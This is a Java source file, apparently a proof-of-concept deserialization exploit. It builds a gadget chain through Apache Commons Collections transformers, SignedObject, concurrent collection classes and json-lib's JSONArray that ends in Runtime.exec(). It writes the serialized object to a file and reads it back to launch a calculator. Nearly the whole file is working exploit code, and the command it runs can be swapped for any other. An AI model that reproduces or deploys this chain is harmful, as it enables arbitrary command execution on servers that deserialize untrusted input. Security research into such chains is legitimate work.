import java.io.*;
import java.io.Serializable;
import java.lang.reflect.Field;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.Signature;
import java.security.SignedObject;
import java.util.Comparator;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.concurrent.ConcurrentSkipListSet;
import java.util.concurrent.CopyOnWriteArraySet;

import net.sf.json.JSONArray;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.collection.AbstractCollectionDecorator;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.ReferenceMap;
import org.apache.commons.collections.set.ListOrderedSet;

/**
 *
 * ObjectInputStream.readObject() ->
 *  ReferenceMap.readObject() ->
 *      AbstractReferenceMap.doReadObject() ->
 *          SignedObject.readObject() ->
 *              AbstractReferenceMap.put() ->
 *                  AbstractHashedMap.put() ->
 *                      AbstractHashedMap.isEqualKey() ->
 *                          CopyOnWriteArraySet.equals() ->
 *                              CopyOnWriteArraySet.eq() ->
 *                                  ConcurrentSkipListSet.equals() ->
 *                                      (Collections)ListOrderedSet.containsAll() ->
 *                                          JSONArray.containsAll() ->
 *                                              JSONArray.containsAll() ->
 *                                                  JSONArray.fromObject() ->
 *                                                      JSONArray._fromCollection() ->
 *                                                          JSONArray.addValue() ->
 *                                                              JSONArray.processValue() ->
 *                                                                  JSONArray._processValue() ->
 *                                                                      AbstractJSON._processValue() ->
 *                                                                          JSONObject.fromObject() ->
 *                                                                              JSONObject._fromBean() ->
 *                                                                                  JSONObject.defaultBeanProcessing() ->
 *                                                                                      PropertyUtils.getProperty() ->
 *                                                                                          PropertyUtilsBean.getProperty() ->
 *                                                                                              PropertyUtilsBean.getNestedProperty() ->
 *                                                                                                  PropertyUtilsBean.getSimpleProperty() ->
 *                                                                                                      PropertyUtilsBean.invokeMethod() ->
 *                                                                                                          SignedObject.getObject() ->
 *                                                                                                              ...
 *                                                                                                              ...
 *                                                                                                              Runtime.exec()
 *
 *
 *
 *
 * @Author: r00t4dm
 * @Date: 2022/1/12 4:27 下午
 */
public class Payload implements Serializable {

    private Serializable payload;

    private Payload (String cmd) throws Exception{
        this.payload = this.setup(cmd);
    }

    private Serializable setup (String cmd) throws Exception{
        final String[] execArgs = new String[] {cmd};

        final Transformer[] transformers =new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class,
                Class[].class}, new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class,
                Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class},
                        execArgs), new ConstantTransformer(1)
        };

        Transformer transformerChain = new ChainedTransformer(transformers);
        final Map innerMap = new HashMap();
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        HashSet map = new HashSet(1);
        map.add("foo");
        Field f= null;

        f = HashSet.class.getDeclaredField("map");
        f.setAccessible(true);

        HashMap innimpl = (HashMap) f.get(map);


        Field f2 = null;

        f2 = HashMap.class.getDeclaredField("table");
        f2.setAccessible(true);
        Object[] array = (Object[]) f2.get(innimpl);
        Object node = array[0];
        if (node == null) {
            node = array[1];
        }

        Field keyField = null;

        keyField = node.getClass().getDeclaredField("key");
        keyField.setAccessible(true);
        keyField.set(node, entry);

        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("DSA");
        keyPairGenerator.initialize(1024);
        KeyPair keyPair = keyPairGenerator.genKeyPair();
        PrivateKey privateKey = keyPair.getPrivate();
        PublicKey publicKey = keyPair.getPublic();

        Signature signature = Signature.getInstance(privateKey.getAlgorithm());
        SignedObject payload = new SignedObject(map, privateKey, signature);

        JSONArray array2 = new JSONArray();
        array2.add("adsf");
        ListOrderedSet set = new ListOrderedSet();
        Field f1= set.getClass().getSuperclass().getSuperclass().getSuperclass().getDeclaredField("collection");
        f1.setAccessible(true);
        f1.set(set, array2);

        DummyComperator comp = new DummyComperator();
        ConcurrentSkipListSet csls = new ConcurrentSkipListSet(comp);
        csls.add(payload);

        CopyOnWriteArraySet s1 = new CopyOnWriteArraySet();
        CopyOnWriteArraySet s2 = new CopyOnWriteArraySet();

        s1.add(set);
        Container c = new Container(csls);
        s1.add(c);

        s2.add(csls);
        s2.add(set);

        ReferenceMap flat3map = new ReferenceMap();
        flat3map.put(new Container(s1), "asdf");
        flat3map.put(new Container(s2), "asdf");

        return flat3map;

    }

    private Object writeReplace () {
        return this.payload;
    }

    private static class Container implements Serializable {
        private Object o ;

        private Container (Object o ) {
            this.o = o;
        }

        private Object writeReplace () {
            return o;
        }
    }

    static class DummyComperator implements Comparator, Serializable {

        @Override
        public int compare(Object o1, Object o2) {
            return 0;
        }

        private Object writeReplace () {
            return null;
        }
    }

    public static void main(String[] args) throws Exception{
        String cmd = "open -a Calculator";
        Payload payload = new Payload(cmd);
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("p.ser"));
        oos.writeObject(payload);
        oos.flush();
        oos.flush();

        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("p.ser"));
        ois.readObject();
    }
}
